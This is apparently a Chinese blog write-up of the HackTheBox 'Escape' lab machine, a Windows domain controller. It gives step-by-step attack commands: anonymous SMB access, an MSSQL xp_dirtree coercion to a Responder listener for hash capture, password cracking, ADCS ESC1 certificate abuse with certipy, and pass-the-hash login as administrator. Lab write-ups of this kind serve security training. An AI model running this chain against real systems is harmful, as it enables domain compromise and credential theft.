---
title: Escape - HackTheBox
url: https://darkwing.moe/2023/02/28/Escape-HackTheBox/
source: 喵喵喵喵
date: 2023-03-01
fetch_date: 2025-10-04T08:16:59.487479
---

# Escape - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Escape - HackTheBox

# Escape - HackTheBox

##### 2023-02-28

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.202](#10-10-11-202)
2. [2. 端口扫描](#端口扫描)
3. [3. SMB](#SMB)
   1. [3.1. SQL Server Procedures.pdf](#SQL-Server-Procedures-pdf)
4. [4. MSSQL](#MSSQL)
   1. [4.1. sql\_svc](#sql-svc)
5. [5. user flag](#user-flag)
6. [6. ADCS](#ADCS)
   1. [6.1. ESC1](#ESC1)
7. [7. root flag](#root-flag)
8. [8. 参考资料](#参考资料)

# Escape - HackTheBox

2023-02-28

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/531>
* ## 10.10.11.202

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023022801.jpg)

# 端口扫描

windows域靶机，还有445，1433：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.202 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 14:57 CST Nmap scan report for 10.10.11.202 Host is up (0.081s latency). Not shown: 988 filtered tcp ports (no-response) PORT     STATE SERVICE       VERSION 53/tcp   open  domain        Simple DNS Plus 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-28 14:58:09Z) 135/tcp  open  msrpc         Microsoft Windows RPC 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after:  2023-11-18T21:20:35 |_ssl-date: 2023-02-28T14:59:31+00:00; +8h00m00s from scanner time. 445/tcp  open  microsoft-ds? 464/tcp  open  kpasswd5? 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after:  2023-11-18T21:20:35 |_ssl-date: 2023-02-28T14:59:30+00:00; +8h00m01s from scanner time. 1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM |_ssl-date: 2023-02-28T14:59:31+00:00; +8h00m00s from scanner time. |_ms-sql-info: ERROR: Script execution failed (use -d to debug) |_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug) | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-02-28T14:54:27 |_Not valid after:  2053-02-28T14:54:27 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-02-28T14:59:31+00:00; +8h00m00s from scanner time. | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after:  2023-11-18T21:20:35 3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.sequel.htb | Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb | Not valid before: 2022-11-18T21:20:35 |_Not valid after:  2023-11-18T21:20:35 |_ssl-date: 2023-02-28T14:59:30+00:00; +8h00m01s from scanner time. Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: |_clock-skew: mean: 8h00m00s, deviation: 0s, median: 7h59m59s | smb2-security-mode: |   311: |_    Message signing enabled and required | smb2-time: |   date: 2023-02-28T14:58:53 |_  start_date: N/A  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 139.60 seconds ``` |

# SMB

smb匿名访问，public里得到一个pdf：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` smbclient -N -L 10.10.11.202 smbclient -N //10.10.11.202/Public get "SQL Server Procedures.pdf" ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023022802.jpg)

## SQL Server Procedures.pdf

pdf中给出了mssql的账号密码：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` PublicUser GuestUserCantWrite1 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023022803.jpg)

# MSSQL

使用得到的账号密码连接：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.10.11.202 ``` |

常规responder+xp\_dirtree得到sql\_svc hash：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` sudo python3 Responder.py -i 10.10.14.9 -v  SQL> exec xp_dirtree '\\10.10.14.9\miao' ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023022804.jpg)

破解出来密码：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  REGGIE1234ronnie (sql_svc) ``` |

## sql\_svc

使用得到的密码登录,现在还不是user：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023022805.jpg)

翻文件发现C:\SQLServer\logs中有一个日志文件，其中得到另一个用户的账号密码，模拟的是使用用户账号密码登录数据库被记录到日志中的场景：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` sequel.htb\Ryan.Cooper NuclearMosquito3 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023022806.jpg)

# user flag

使用sql日志中得到的账号密码登录，桌面得到user flag：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023022807.jpg)

# ADCS

提权部分是adcs，可以使用certipy远程进行：

* ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse
  <https://github.com/ly4k/Certipy>

发现脆弱的证书模板：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` certipy find -vulnerable -stdout -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202  Template Name                       : UserAuthentication Display Name                        : UserAuthentication Certificate Authorities             : sequel-DC-CA ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023022808.jpg)

## ESC1

直接根据文档里的ESC1利用方式一步步来即可得到administrator的NTLM hash：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` certipy req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -target 10.10.11.202 -template UserAuthentication -ca sequel-DC-CA -upn administrator@sequel.htb -dns 10.10.11.202 -dc-ip 10.10.11.202  # auth时可能会报错时钟偏移问题，先ntp同步时间 sudo ntpdate -s 10.10.11.202  certipy-ad auth -pfx administrator_10.pfx -dc-ip 10.10.11.202  [*] Got NT hash for 'administrator@sequel.htb': a52f78e4c751e5f5e17e1e9f3e58f4ee ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023022809.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023022810.jpg)

# root flag

使用得到的hash登录：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` evil-winrm -i 10.10.11.202 -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023022811.jpg)

# 参考资料

* ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse
  <https://github.com/ly4k/Certipy>
* Writeup Escape HackTheBox
  <https://gatogamer1155.github.io/htb/escape/>
* Escape - HTB [Discussion] | BreachForums
  <https://breached.vc/Thread-Escape-HTB-Discussion>

> Last updated: 2023-06-19 09:02:26
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### Agile - HackTheBox](/2023/03/06...